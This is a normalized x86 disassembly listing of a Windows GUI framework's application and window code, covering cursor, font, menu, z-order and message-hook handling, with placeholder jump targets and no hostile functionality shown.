mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_45ff5c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_45ff34
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_4074a8
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_40742c
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45ffec
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_460131
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_462418
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_4216d0
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_4216d0
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_4217b4
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_4216d0
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_4216d0
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_4216d0
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_462418
mov eax [ ebx + 0x80 ]
mov edx 0x80000017
call sub_421514
mov eax [ ebx + 0x88 ]
mov edx 0x80000007
call sub_421514
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460138
cmp [ rw-data ] 0x0
je r-xdata
sub_460170
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_4601d0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_46030c ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_460380
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45fad8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4161a0
mov dl [ ebp - 0x1 ]
call sub_4601d0
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_45fac4
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_416044
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_41621c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4161a0
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_460170
test al al
je r-xdata
inc esi
sub_4604cc
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45fad8
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_45fac4
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_460524
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_4604cc
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46059e
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_460380
pop ecx
push ebp
mov al 0x2
call sub_460380
pop ecx
push ebp
mov al 0x3
call sub_460380
pop ecx
push ebp
mov al 0x4
call sub_460380
pop ecx
push ebp
mov al 0x5
call sub_460380
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4036c0
retn
sub_4605ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_460140
xor eax eax
push ebp
push sub_460625
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_460524
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_460148
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_460640
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_40442c
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_404480
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_460698
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_4606c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_462a28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4606ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_4405dc
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_462aa4
sub_460748
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_461b5c
sub_46078c
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_460748
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_4606ec
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_460800
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_46085c
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_46088c
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_4608b4
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_46085c
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_46088c
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_46088c
sub_4608f4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41e1a4
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_461f40
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0x80000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280bc
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_42848c
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4626a8
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40cca8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_462138
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40ccd0
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408fcc
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404694
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_462884
mov eax ebx
call sub_463214
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_460bfc
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_460add
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_463224
mov [ esp + 0x4 ] esi
mov [ esp ] sub_461f40
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_462138
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_462aa4
xor edx edx
mov eax esi
call sub_462418
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e1f0
push esi
push sub_460fcc
mov eax esi
call sub_461d2c
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_406194
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_4036c0
mov eax [ esi + 0x90 ]
call sub_4036c0
mov eax [ esi + 0x98 ]
call sub_4036c0
test bl bl
jle r-xdata
call sub_41f2c0
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_460bfc
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_460d93
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460d9a
lea eax [ ebp - 0x2c ]
call sub_40442c
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_461118
call sub_41f228
mov [ ebx + 0x40 ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_4048dc
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_4074c8
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_40442c
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_4617f0
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_4617f0
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_460da0
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_45fae0
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_460e00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_416044
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_448484
cmp ebx eax
je r-xdata
sub_460e70
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_460e00
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4161a0
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_460f30
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4161a0
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_460fcc
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40cf70
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_45ffec
mov eax [ rw-data ]
call sub_460634
sub_461024
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_461081
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x122 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461088
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_40461c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
sub_461090
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4610cc
push ebp
mov ebp esp
